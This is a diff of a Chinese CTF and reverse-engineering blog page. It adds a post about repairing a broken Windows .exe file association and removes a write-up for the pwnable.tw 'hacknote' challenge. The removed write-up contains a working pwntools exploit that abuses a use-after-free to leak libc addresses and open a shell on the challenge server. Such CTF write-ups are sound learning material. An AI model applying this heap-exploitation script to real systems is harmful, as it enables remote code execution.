@@ -67,6 +67,56 @@
       <div id="main" class="wrapper">
         <div id="primary" class="site-content"><div id="content" role="main">
   
+    <article id="post-改错注册表之后。。。" class="post-改错注册表之后。。。 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2017/10/20/改错注册表之后。。。/">改错注册表之后。。。</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/10/20/改错注册表之后。。。/" data-id="cjk0lq5nv001i413k7zd5ex5v" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <p>emmmmmmmm……经过一些骚操作，我改错了注册表，导致exe程序只能右键管理员运行，还是无意中发现的，修复了文件关联，发现没用。</p>
+<h2 id="文件关联"><a href="#文件关联" class="headerlink" title="文件关联"></a>文件关联</h2><p>写下如下代码，改后缀为reg，双击运行，修改hkey_classes_root\exefile\shell\open\command键值，可以自己尝试修改为其他键值，会有惊喜！</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">REGEDIT4</span><br><span class="line"></span><br><span class="line">[hkey_classes_root\.exe]</span><br><span class="line"></span><br><span class="line">@=<span class="string">"exefile"</span></span><br><span class="line"></span><br><span class="line">[hkey_classes_root\exefile\shell\open\command]</span><br><span class="line"></span><br><span class="line">@=<span class="string">"%1"</span> %*</span><br></pre></td></tr></table></figure>
+<h2 id="真正原因"><a href="#真正原因" class="headerlink" title="真正原因"></a>真正原因</h2><p>晚上已经绝望到是否要重装了，突然发现我修改错了键值，修改了hkey_classes_root\evtxfile\Shell\open\command，将键值改回原样，系统恢复正常，百度发现还没有evtxfile键值的相关说明，只是command键值里面相关的eventvwr.exe似乎与windows加载有关系，emmmmmm，有待研究。</p>
+<p>总之，电脑总算恢复正常啦！然而，厄运并没有结束。。。早晨，手机莫名被锁。。。怎一个愁字了得！</p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2017/10/20/改错注册表之后。。。/">
+    <time datetime="2017-10-20T04:29:57.000Z" class="entry-date">
+        2017-10-20
+    </time>
+</a>
+    
+    
+  <span class="article-delim">&#8226;</span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/杂谈/">杂谈</a></li></ul>
+
+    </footer>
+</article>
+
+
+
+
+
+
+  
     <article id="post-几种可作为工具使用常用注入姿势" class="post-几种可作为工具使用常用注入姿势 post type-post status-publish format-standard hentry">
     <!---->
 
@@ -82,7 +132,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/10/02/几种可作为工具使用常用注入姿势/" data-id="cjjnztsff001d783k1d0y7hde" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/10/02/几种可作为工具使用常用注入姿势/" data-id="cjk0lq5nz001l413kpgbkpjqw" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -139,7 +189,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/09/30/Win7x64-DLL-Remote-Injection-Hide-Process/" data-id="cjjnztsje002a783ko47dr8ze" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/09/30/Win7x64-DLL-Remote-Injection-Hide-Process/" data-id="cjk0lq5oi002e413k9r4fnj79" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -191,7 +241,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/09/18/whctf2018/" data-id="cjjnztseu000t783klsk2ysq8" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/09/18/whctf2018/" data-id="cjk0lq5nn0011413kjgnvpq2l" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -258,7 +308,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/09/18/reversing-kr/" data-id="cjjnztsmu002i783k231gc7yz" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/09/18/reversing-kr/" data-id="cjk0lq5ow002m413kib83b789" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -376,7 +426,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/09/12/babyvm/" data-id="cjjnztse5000f783kz6tw1txv" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/09/12/babyvm/" data-id="cjk0lq5n6000i413kdvoq8fwh" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -439,7 +489,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/09/02/简单的基于壳的变形壳工具/" data-id="cjjnztsjj002b783kod5dbhvl" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/09/02/简单的基于壳的变形壳工具/" data-id="cjk0lq5oj002f413k7jt0f14d" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -493,7 +543,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/09/01/我的内心久久不能平静/" data-id="cjjnztsfb0017783k0cbtajen" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/09/01/我的内心久久不能平静/" data-id="cjk0lq5nt001d413kouvvql8f" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -541,7 +591,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/09/01/win32和MFC逆向总结/" data-id="cjjnztsew000w783kstbep8c7" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/09/01/win32和MFC逆向总结/" data-id="cjk0lq5nq0016413khlpq1dv9" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -602,7 +652,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/09/01/windbg/" data-id="cjjnztsfi001g783ko6s9347m" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/09/01/windbg/" data-id="cjk0lq5np0014413kw1cj8a4l" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -655,58 +705,6 @@
 
 
   
-    <article id="post-pwnable-tw-hacknote" class="post-pwnable-tw-hacknote post type-post status-publish format-standard hentry">
-    <!---->
-
-      <header class="entry-header">
-        
-        
-  
-    <h1 class="entry-title">
-      <a class="article-title" href="/2017/08/23/pwnable-tw-hacknote/">pwnable.tw-hacknote</a>
-    </h1>
-  
-
-        
-        <div class="comments-link">
-            
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/08/23/pwnable-tw-hacknote/" data-id="cjjnztsej000m783kc52vr38g" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
-        </div><!-- .comments-link -->
-      </header><!-- .entry-header -->
-
-    <div class="entry-content">
-      
-        <h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><p>原来一直都是做reverse的，同学让我看一道pwnable.tw上堆的题目，自己最近也刚刚温习了pwn，也有练习的必要。这道题是pwnable.tw上的hacknote，题目有add,delete,print note三个功能，其中add一个note，申请了两个堆块，一个堆块固定8字节，前4字节是类似打印功能的printf函数，后4个字节指向申请的第二个堆块，大小随意。思路就是我们需要让写的内容能覆盖固定的8字节堆块，一方面可以打印got表地址，一方面改写printf函数地址为system，下一个地址紧跟sh的地址，实现利用。总的来说这是UAF的漏洞，创造一个迷途指针，然后让其他堆块的指针指向这个迷途指针，实现覆盖地址，调用这个迷途指针完成打印got表，执行system的功能，脚本如下：  </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./hacknote')</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10102</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hacknote'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('./libc.so.6')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">print_addr = <span class="number">0x804862B</span></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">payload = p32(print_addr) + p32(read_got)</span><br><span class="line"></span><br><span class="line"><span class="comment">#add 0</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Note size :"</span>)</span><br><span class="line">p.sendline(<span class="string">"16"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content :"</span>)</span><br><span class="line">p.sendline(<span class="string">"123456"</span>)</span><br><span class="line"><span class="comment">#add 1</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Note size :"</span>)</span><br><span class="line">p.sendline(<span class="string">"16"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content :"</span>)</span><br><span class="line">p.sendline(<span class="string">"234567"</span>)</span><br><span class="line"><span class="comment">#delete 1 0</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">p.sendline(<span class="string">"0"</span>)</span><br><span class="line"><span class="comment">#add 2</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Note size :"</span>)</span><br><span class="line">p.sendline(<span class="string">"8"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content :"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#print 1</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="comment">#recv real address of read</span></span><br><span class="line"><span class="comment">#read_addr = u32(p.recvline()[-5:-1])</span></span><br><span class="line">read_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(hex(read_addr))</span><br><span class="line"></span><br><span class="line">system_addr = read_addr + libc.symbols[<span class="string">'system'</span>] - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">log.info(hex(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#delete 2</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"><span class="comment">#payload2</span></span><br><span class="line">payload2 = flat([system_addr, <span class="string">";sh;"</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#add 4</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Note size :"</span>)</span><br><span class="line">p.sendline(<span class="string">"8"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content :"</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#call system</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-    </div><!-- .entry-content -->
-
-    <footer class="entry-meta">
-    <a href="/2017/08/23/pwnable-tw-hacknote/">
-    <time datetime="2017-08-23T03:23:01.000Z" class="entry-date">
-        2017-08-23
-    </time>
-</a>
-    
-  <span class="article-delim">&#8226;</span>
-  <div class="article-category">
-  <a class="article-category-link" href="/categories/pwn/">pwn</a>
-  </div>
-
-    
-  <span class="article-delim">&#8226;</span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable-tw/">pwnable.tw</a></li></ul>
-
-    </footer>
-</article>
-
-
-
-
-
-
-  
   
     <nav id="pagination">
       <nav id="page-nav">
@@ -731,7 +729,7 @@
   <aside class="widget">
     <h3 class="widget-title">Categories</h3>
     <div class="widget-content">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/XCTF2018/">XCTF2018</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/hctf/">hctf</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a><span class="category-list-count">6</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/XCTF2018/">XCTF2018</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/hctf/">hctf</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a><span class="category-list-count">6</span></li></ul>
     </div>
   </aside>
 
@@ -741,6 +739,10 @@
     <h3 class="widget-title">Recents</h3>
     <div class="widget-content">
       <ul>
+        
+          <li>
+            <a href="/2018/07/25/pwn-unlink/">pwn-unlink</a>
+          </li>
         
           <li>
             <a href="/2018/07/16/QCTF-xman/">QCTF-xman</a>
@@ -756,10 +758,6 @@
         
           <li>
             <a href="/2018/04/13/HITBCTF2018-reverse-hex/">HITBCTF2018-reverse-hex</a>
-          </li>
-        
-          <li>
-            <a href="/2018/03/20/Play-Rtsp-Stream-opencv2/">Play Rtsp Stream-opencv2</a>
           </li>
         
       </ul>
